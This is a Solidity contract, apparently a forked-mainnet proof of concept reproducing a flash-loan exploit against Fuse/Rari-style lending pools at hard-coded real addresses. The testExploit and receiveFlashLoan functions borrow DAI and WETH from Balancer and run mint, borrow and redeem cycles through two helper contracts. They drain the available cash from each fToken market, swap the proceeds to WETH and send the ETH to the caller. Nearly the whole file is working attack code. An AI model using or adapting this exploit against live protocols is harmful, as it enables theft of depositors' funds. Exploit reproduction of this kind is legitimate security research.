// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

// import "forge-std/Test.sol";
// import "forge-std/console.sol";

import "../HarvestFF/interfaces/IFlashLoanReceiver.sol";
import "../HarvestFF/interfaces/ILendingPool.sol";
import "../HarvestFF/interfaces/ILendingPoolAddressesProvider.sol";
import "../HarvestFF/interfaces/IERC20.sol";
import "../HarvestFF/interfaces/IUniswapV2Router02.sol";

import "./interfaces/CErc20Interface.sol";
import "./interfaces/ComptrollerInterface.sol";

// import "./Convert8.sol";

// fork_block_number = 14684685
interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}
interface UniSwapV2 {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint deadline;
        uint amountIn;
        uint amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    /// @notice Swaps amountIn of one token for as much as possible of another token
    /// @param params The parameters necessary for the swap, encoded as ExactInputSingleParams in calldata
    /// @return amountOut The amount of the received token
    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint amountOut);

    struct ExactInputParams {
        bytes path;
        address recipient;
        uint deadline;
        uint amountIn;
        uint amountOutMinimum;
    }

    /// @notice Swaps amountIn of one token for as much as possible of another along the specified path
    /// @param params The parameters necessary for the multi-hop swap, encoded as ExactInputParams in calldata
    /// @return amountOut The amount of the received token
    function exactInput(
        ExactInputParams calldata params
    ) external payable returns (uint amountOut);
}

interface IUniswapV2Pair {
    function swap(
    uint256 amount0Out,
    uint256 amount1Out,
    address to,
    bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

interface IWETH {
    function transfer(address to, uint value) external returns (bool);
    function deposit() external payable;
    function withdraw(uint wad) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

interface IFETH {
    function mint() external payable;
    function getCash() external view returns (uint);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function redeem(uint redeemTokens) external returns (uint);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

interface IVault {
    function flashLoan(
        address receiver,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IConvert {
    // function gamja(address _fToken, uint256 _amount) external payable;
    function _bootLoad(address fToken) external;
    function _cBorrow(uint cBorrow) external;
    function _cMint() external;
    function _cRedeemAll() external;
}

// 0x0f75349606610313cb666277eeda612e72be624cae061d017e503056bbf4d8e0 <OPT>
contract ExploitTest {
// contract ExploitTest is Test {
    ComptrollerInterface unitroller = ComptrollerInterface(0xc54172e34046c1653d1920d40333Dd358c7a1aF4); // Unitroller
    
    
    CErc20Interface fDAI = CErc20Interface(payable(0x7e9cE3CAa9910cc048590801e64174957Ed41d43));    // fDAI-8
    CErc20Interface fFEI = CErc20Interface(payable(0xd8553552f8868C1Ef160eEdf031cF0BCf9686945));    // fFEI-8
    CErc20Interface fETH = CErc20Interface(payable(0xbB025D470162CC5eA24daF7d4566064EE7f5F111));    // fETH-8
    CErc20Interface fLUSD = CErc20Interface(payable(0x647A36d421183a0a9Fa62717a64B664a24E469C7));   // fFRAX-8
    

    CErc20Interface[] fTokens = [fDAI, fFEI, fETH, fLUSD];


    IUniswapV2Router uniswap = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    ISwapRouter constant uniswapV3router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // balancer protocol flash loan check
    
    IERC20 constant FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);
    IERC20 constant FEI = IERC20(0x956F47F50A910163D8BF957Cf5846D573E7f87CA);
    IERC20 constant LUSD = IERC20(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0);
    IERC20 constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);


    // uniswap
    IUniswapV2Router uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    

    // balancer check
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; 
    IVault balancerVault = IVault(BALANCER_VAULT);

    address me;
    address ca;
    // Convert8 oca;
    // Convert8 oca2;
    address oca;
    address oca2;
    // FxToken Address
    address fTokenCache;
    uint256 mintTokenCache;

    constructor() {
        // payable(address(0x0)).transfer(address(this).balance);
        me = address(tx.origin);
        ca = address(this);
        // oca = new Convert8();
        // oca2 = new Convert8();
        oca = address(0x2EBB06c0683f62873B76714FF51bBD2bC245Fa1C);
        oca2 = address(0x2B2BbD94AdB79d34deB5B3e6EfCf97747b4Ae0B5);
    }

    function testExploit() public {
        
        uint256 _default = 79228162514264337593543950335;

        payable(address(0x0)).transfer(address(this).balance);
        // emit log_named_uint("CA: WETH balance", WETH.balanceOf(address(this)));        
        // emit log_named_uint("EOA: ETH balance", address(tx.origin).balance);

        // balancer flash loan
        IERC20[] memory tokens = new IERC20[](2);
        uint256[] memory amounts = new uint256[](2);
        
        // amounts=[50000000000000, 50000000000000000000000]
        tokens[0] = DAI;
        tokens[1] = WETH;
        amounts[0] = 90000000000000000000000000;// attacker DIA
        amounts[1] = 50000000000000000000000; // attacker WETH
        
        sendFlashLoan(tokens, amounts);

        uint256 _profitLUSD = LUSD.balanceOf(address(this));
        uint256 _profitFei = FEI.balanceOf(address(this));
        uint256 _profitDAI = DAI.balanceOf(address(this));

        // emit log_named_uint("CA: LUSD balance", _profitLUSD);
        // emit log_named_uint("CA: FEI balance", _profitFei);
        // emit log_named_uint("CA: DAI balance", _profitDAI);

        unchecked {
            uint256 _profitFei = FEI.balanceOf(address(this));
            uniswapSwap(_profitFei, FEI);
            uint256 _profitDAI = DAI.balanceOf(address(this));
            uniswapSwapToWETH(_profitDAI, DAI);
            uint256 _profitLUSD = LUSD.balanceOf(address(this));
            uniswapSwapToWETH(_profitLUSD, LUSD);
            IWETH(address(WETH)).withdraw(IWETH(address(WETH)).balanceOf(address(this)));
            payable(tx.origin).transfer(address(this).balance);     
        }

        // emit log_named_uint("CA: WETH balance", WETH.balanceOf(address(this)));        
        // emit log_named_uint("PROFIT(8) EOA: ETH balance", address(tx.origin).balance - _default);
    }

    function uniswapSwap(uint256 _amountIn, IERC20 _tokens) internal {
        _tokens.approve(address(uniswapRouter), _amountIn);
        _tokens.approve(address(this), _amountIn);
    
        address[] memory path = new address[](2);
        path[0] = address(_tokens);
        path[1] = address(WETH);
        uniswapRouter.swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    }
    function uniswapSwapToWETH(uint256 _amountIn, IERC20 _tokens) internal {
        // _tokens.approve(address(uniswapV3router), _amountIn);
        // _tokens.approve(address(this), _amountIn);
    
        address[] memory path = new address[](2);
        path[0] = address(_tokens);
        path[1] = address(WETH);
        
        uint amountOut = swapExactInputSingleHop(path[0],path[1], 3000, _amountIn);

        // IUniswapV2Router(address(0x9A0CC6791a5409ce3547F1f1d00e058c79D0A72c)).swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    }
    function swapExactInputSingleHop(
        address tokenIn,
        address tokenOut,
        uint24 poolFee,
        uint amountIn
    ) public returns (uint amountOut) {
        // IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
        IERC20(tokenIn).approve(address(uniswapV3router), amountIn);
        IERC20(tokenIn).approve(address(this), amountIn);


        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                fee: poolFee,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amountIn,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        amountOut = uniswapV3router.exactInputSingle(params);
    }

    receive() external payable {
        // emit log_named_uint("ETH", msg.value);
    }

    function sendFlashLoan(IERC20[] memory tokens, uint256[] memory amounts) public {
        uint _tokens_len = tokens.length;
        uint _amounts_len = amounts.length;

        IERC20[] memory _tokens = new IERC20[](_tokens_len);
        uint256[] memory _amounts = new uint256[](_amounts_len);
        
        for (uint i = 0; i < _tokens_len; i++) {
            _tokens[i] = tokens[i];
            _amounts[i] = amounts[i];
        }
        balancerVault.flashLoan(address(this), _tokens, _amounts, "");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // emit log_named_uint("loan", amounts[0]);
        tokens[0].transfer(address(oca), amounts[0]);
        // IConvert(oca).gamja(address(fTokens[0]), IFETH(address(fETH)).getCash());
        IConvert(oca)._bootLoad(address(fTokens[0]));
        IConvert(oca)._cMint();
        // emit log_named_uint("FETH", IFETH(address(fETH)).getCash());
        IConvert(oca)._cBorrow(IFETH(address(fETH)).getCash());
        IConvert(oca)._cRedeemAll();

        IWETH(address(WETH)).withdraw(50000000000000000000000);
        IFETH(address(fETH)).mint{value: 50000000000000000000000}();


        address[] memory cToken = new address[](1);
        cToken[0] = address(fETH);
        unitroller.enterMarkets(cToken);

        for (uint8 i=0; i < fTokens.length;) {
            unchecked {
                CErc20Interface _fToken = fTokens[i];
                _fToken.borrow(_fToken.getCash());   
                i++;
            }
        }
        
        tokens[0].transfer(address(oca2), amounts[0]);
        
        IConvert(oca2)._bootLoad(address(fTokens[0]));
        IConvert(oca2)._cMint();
        (uint256 _x, uint256 _y, uint256 _z) = unitroller.getAccountLiquidity(address(oca2));
        // emit log_named_uint("_y", _y);
        IConvert(oca2)._cBorrow(_y);
        IConvert(oca2)._cRedeemAll();
        // IConvert(oca2).gamja(address(fTokens[0]), _y);
        // emit log_named_uint("FETH", IFETH(address(fETH)).getCash());
        IFETH(address(fETH)).redeemUnderlying(IFETH(address(fETH)).getCash());
        
        IWETH(address(WETH)).deposit{value: 50000000000000000000000}();
        IWETH(address(WETH)).transfer(msg.sender, 50000000000000000000000);

        uint256 new_fee = feeAmounts[0];
        tokens[0].transfer(msg.sender, amounts[0] + new_fee);     

        payable(tx.origin).transfer(address(this).balance);
    }
}
